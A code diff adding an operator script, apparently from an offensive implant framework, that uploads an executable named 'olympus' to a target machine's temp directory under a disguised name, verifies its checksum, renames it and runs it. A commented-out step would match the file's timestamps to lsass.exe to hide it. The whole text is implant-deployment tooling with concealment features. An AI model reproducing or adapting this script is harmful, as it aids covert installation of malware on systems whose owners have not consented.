@@ -1,0 +1,82 @@
+ifnot (`script canGetOut.eps`) {
+	echo "Cannot get out!!!  Not installing olympus!!\n";
+	return false;
+}
+
+# get name of olympus file
+string $olyPath="E:\\resources\\olympus";
+string $olyFile="install_933c.exe";
+
+# TODO: get better temp path directory
+### Get temp path
+string $temppath;
+#string $temppath="C:\\recycler\\S-1-5-21-1013845014-287268453-925700815-1069";
+@echo off;
+@record on;
+ifnot(`lpgetenv -option temppath`) {
+	`script temppath.eps`;
+	ifnot(`lpgetenv -option temppath`) {
+		echo "Could not get temp path.  Exiting.";
+		return false;
+	} else {
+		$temppath=GetCmdData("value");
+	}
+} else {
+	$temppath=GetCmdData("value");
+}
+@echo on;
+@record off;
+
+
+# put up as new name
+string $tempname="\$agn\$tst.tmp";
+string $newname="\$agn\$tst.exe";
+
+if (`dir "$tempname -path $temppath"`) {
+	echo "Temp name exists!!!  Please reconsider before continuing!\n";
+	pause;
+}
+if (`dir "$newname" -path "$temppath"`) {
+	echo "Executable name exists!!!  Please reconsider before continuing!\n";
+	pause;
+}
+
+ifnot (`put "$olyPath\\$olyFile" -name "$temppath\\$tempname" -permanent`) {
+	echo "ERROR putting up olympus!";
+	pause;
+} else {
+	# Compare checksums
+	ifnot (`script checksum.eps "$olyFile" "$olyPath" "$tempname" "$temppath"`) {
+		`del $tempname -path $temppath`;
+		return false;
+	}
+}
+
+# match times
+#`matchtimes $systemroot\\system32\\lsass.exe $newname`;
+
+# run
+if (prompt "Run olympus installer?") {
+	if (`move "$temppath\\$tempname" "$temppath\\$newname"`) {
+		`run -command "$temppath\\$newname"`;
+		echo "Hit return when done running.";
+		pause;
+		echo "Successfully installed Olympus ($olyFile)";
+		ifnot(`dir "$tempname" -path "$temppath"`) {
+			ifnot(`dir "$newname" -path "$temppath"`) {
+				return true;
+			} else {
+				echo "$temppath\\$newname still exists!";
+				return false;
+			}
+		} else {
+			echo "$temppath\\$tempname still exists!";
+			return false;
+		}
+	} else {
+		echo "Error renaming olympus!!";
+		return false;
+	}
+} else {
+	return true;
+}
